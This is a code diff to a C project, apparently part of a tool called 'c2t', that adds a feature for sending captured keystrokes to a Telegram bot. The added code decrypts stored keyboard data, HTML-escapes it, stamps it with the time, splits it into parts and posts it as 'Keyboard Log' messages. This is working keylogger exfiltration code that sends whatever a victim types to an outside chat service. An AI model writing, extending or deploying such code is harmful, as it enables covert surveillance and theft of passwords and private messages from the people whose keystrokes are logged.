@@ -18,7 +18,10 @@
 #include "telegram.h"
 #include "telegram_platform.h"
 #include "../config/config.h"
+#include "../keyboard/keyboard.h"
+#include "../keyboard/keyboard_output.h"
 #include "../logging/logging.h"
+
 
 #include <ctype.h>
 #include <stdint.h>
@@ -892,6 +895,121 @@ static int send_encrypted_file(const void *encrypted_data, size_t length,
     return telegram_http_post_stream(bot_token, method, content_type, &stream);
 }
 
+static void escape_html_append(const char *src, size_t src_len, char *dst, size_t dst_cap, size_t *dst_len)
+{
+    for (size_t i = 0; i < src_len; i++) {
+        char ch = src[i];
+        const char *entity = nullptr;
+        size_t elen = 0;
+        if (ch == '&') {
+            entity = "&amp;";
+            elen = 5;
+        } else if (ch == '<') {
+            entity = "&lt;";
+            elen = 4;
+        } else if (ch == '>') {
+            entity = "&gt;";
+            elen = 4;
+        } else if (ch == '"') {
+            entity = "&quot;";
+            elen = 6;
+        }
+
+        if (entity) {
+            if (*dst_len + elen < dst_cap) {
+                memcpy(dst + *dst_len, entity, elen);
+                *dst_len += elen;
+            }
+        } else {
+            if (*dst_len + 1 < dst_cap) {
+                dst[(*dst_len)++] = ch;
+            }
+        }
+    }
+    dst[*dst_len] = '\0';
+}
+
+int telegram_send_keyboard(const char *text, size_t length)
+{
+    if (!initialized || !text || length == 0)
+        return 1;
+
+    int mode = keyboard_get_format_mode();
+    if (mode == KEYBOARD_MODE_RAW) {
+        return telegram_send(text, length, nullptr);
+    }
+
+    time_t raw_now = time(nullptr);
+    struct tm tm_buf;
+    char time_str[32] = "00:00:00";
+#ifdef _WIN32
+    if (localtime_s(&tm_buf, &raw_now) == 0) {
+        strftime(time_str, sizeof(time_str), "%H:%M:%S", &tm_buf);
+    }
+#else
+    if (localtime_r(&raw_now, &tm_buf) != nullptr) {
+        strftime(time_str, sizeof(time_str), "%H:%M:%S", &tm_buf);
+    }
+#endif
+
+    #define MAX_CODE_BODY_LEN 3200
+
+    size_t max_escaped_len = length * 6 + 1;
+    char *escaped = malloc(max_escaped_len);
+    if (!escaped) {
+        return telegram_send(text, length, nullptr);
+    }
+
+    size_t escaped_len = 0;
+    escape_html_append(text, length, escaped, max_escaped_len, &escaped_len);
+
+    int result = 1;
+    if (escaped_len <= MAX_CODE_BODY_LEN) {
+        char msg[4096];
+        snprintf(msg, sizeof(msg),
+                 "⌨️ <b>Keyboard Log</b> <i>(%s)</i>:\n"
+                 "<pre><code class=\"language-text\">%s</code></pre>",
+                 time_str, escaped);
+        result = telegram_send_html(msg);
+    } else {
+        size_t total_chunks = (escaped_len + MAX_CODE_BODY_LEN - 1) / MAX_CODE_BODY_LEN;
+        size_t chunk_idx = 0;
+        size_t offset = 0;
+
+        while (offset < escaped_len) {
+            size_t take = escaped_len - offset;
+            if (take > MAX_CODE_BODY_LEN)
+                take = MAX_CODE_BODY_LEN;
+
+            if (take < escaped_len - offset && escaped[offset + take - 1] == '&') {
+                while (take > 0 && escaped[offset + take - 1] != ';') {
+                    take--;
+                }
+            }
+
+            char chunk_buf[MAX_CODE_BODY_LEN + 1];
+            memcpy(chunk_buf, escaped + offset, take);
+            chunk_buf[take] = '\0';
+
+            char msg[4096];
+            snprintf(msg, sizeof(msg),
+                     "⌨️ <b>Keyboard Log</b> <i>(%s - Part %llu/%llu)</i>:\n"
+                     "<pre><code class=\"language-text\">%s</code></pre>",
+                     time_str, (unsigned long long)++chunk_idx,
+                     (unsigned long long)total_chunks, chunk_buf);
+
+
+            if (!telegram_send_html(msg)) {
+                result = 0;
+            }
+            offset += take;
+        }
+    }
+
+    free(escaped);
+    return result;
+}
+
 int telegram_send_encrypted_data(const void *encrypted_data, size_t length,
                                  const unsigned char nonce[C2T_CRYPTO_NONCE_SIZE],
                                  const char *mime_type,
@@ -901,6 +1019,22 @@ int telegram_send_encrypted_data(const void *encrypted_data, size_t length,
         return 1;
     if (!encrypted_data || !nonce || !mime_type)
         return 0;
+
+    if (strcmp(mime_type, C2T_KEYBOARD_MIME_TYPE) == 0) {
+        if (length < TELEGRAM_MAX_CHARACTERS) {
+            char text_buf[TELEGRAM_MAX_CHARACTERS + 1];
+            c2t_secure_lock(text_buf, sizeof(text_buf));
+            if (!c2t_crypto_decrypt(encrypted_data, length, nonce, text_buf)) {
+                c2t_secure_unlock(text_buf, sizeof(text_buf));
+                return 0;
+            }
+            text_buf[length] = '\0';
+            int res = telegram_send_keyboard(text_buf, length);
+            c2t_secure_zero(text_buf, sizeof(text_buf));
+            c2t_secure_unlock(text_buf, sizeof(text_buf));
+            return res;
+        }
+    }
 
     if (mime_has_prefix(mime_type, "text/") && length < TELEGRAM_MAX_CHARACTERS) {
         char text_buf[TELEGRAM_MAX_CHARACTERS + 1];
@@ -922,6 +1056,7 @@ int telegram_send_encrypted_data(const void *encrypted_data, size_t length,
     c2t_log_info("telegram", "Encrypted delivery %s", result ? "completed" : "failed");
     return result;
 }
+
 
 int telegram_send_encrypted_file(const void *encrypted_data, size_t length,
                                  const unsigned char nonce[C2T_CRYPTO_NONCE_SIZE],
